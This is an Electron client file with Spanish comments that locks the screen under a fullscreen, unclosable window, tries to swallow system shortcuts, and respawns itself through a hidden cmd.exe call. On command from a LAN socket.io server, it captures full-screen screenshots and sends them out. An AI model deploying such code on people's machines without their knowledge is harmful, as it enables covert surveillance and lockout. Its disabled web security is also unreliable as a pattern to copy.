const { app, BrowserWindow, screen, globalShortcut, desktopCapturer } = require('electron');
const { io } = require('socket.io-client');
const path = require('path');
const { exec } = require('child_process');
const fs = require('fs').promises;

let mainWindow;
let isBlocked = true;
const socket = io('http://192.168.1.88:3000');

async function takeScreenshot() {
  try {
    // Capturar la pantalla principal
    const sources = await desktopCapturer.getSources({
      types: ['screen'],
      thumbnailSize: { width: 1920, height: 1080 }
    });
    
    const screenshot = sources[0].thumbnail.toJPEG(100);
    
    // Convertir a base64
    const base64Image = screenshot.toString('base64');
    
    // Enviar al servidor
    socket.emit('screenshotTaken', base64Image);
    
  } catch (error) {
    console.error('Error al tomar screenshot:', error);
    socket.emit('screenshotError', error.message);
  }
}

function createWindow() {
  const { width, height } = screen.getPrimaryDisplay().workAreaSize;
  
  mainWindow = new BrowserWindow({
    width,
    height,
    fullscreen: true,
    alwaysOnTop: true,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
      webSecurity: false
    }
  });

  mainWindow.loadFile('index.html');
  mainWindow.setClosable(false);
  
  globalShortcut.registerAll(['Alt+Tab', 'Alt+F4', 'CommandOrControl+W', 'CommandOrControl+R', 
    'CommandOrControl+Shift+I', 'F11', 'Alt+Space', 'CommandOrControl+Tab', 'Alt+Esc', 
    'CommandOrControl+Shift+Esc', 'CommandOrControl+Alt+Delete'], () => {
    return false;
  });

  mainWindow.on('close', (e) => {
    if (isBlocked) {
      e.preventDefault();
    }
  });
}

app.on('window-all-closed', () => {
  if (isBlocked) {
    exec('start cmd.exe /c "node start.js"', { windowsHide: true });
  }
});

app.whenReady().then(() => {
  createWindow();
  
  setInterval(() => {
    if (mainWindow && isBlocked && !mainWindow.isVisible()) {
      mainWindow.show();
      mainWindow.setAlwaysOnTop(true, 'screen-saver');
    }
  }, 1000);
});

// Eventos socket.io existentes
socket.on('block', () => {
  isBlocked = true;
  if (mainWindow) {
    mainWindow.show();
    mainWindow.setAlwaysOnTop(true, 'screen-saver');
  }
});

socket.on('unblock', () => {
  isBlocked = false;
  if (mainWindow) {
    mainWindow.hide();
    mainWindow.setAlwaysOnTop(false);
  }
});

socket.on('updateTask', (task) => {
  if (mainWindow) {
    mainWindow.webContents.send('taskUpdate', task);
  }
});

// Nuevo evento para tomar screenshot
socket.on('takeScreenshot', () => {
  takeScreenshot();
});

socket.on('initialState', (state) => {
  isBlocked = state.isBlocked;
  if (mainWindow) {
    if (state.isBlocked) {
      mainWindow.show();
      mainWindow.setAlwaysOnTop(true, 'screen-saver');
    } else {
      mainWindow.hide();
      mainWindow.setAlwaysOnTop(false);
    }
    mainWindow.webContents.send('taskUpdate', state.currentTask);
  }
});
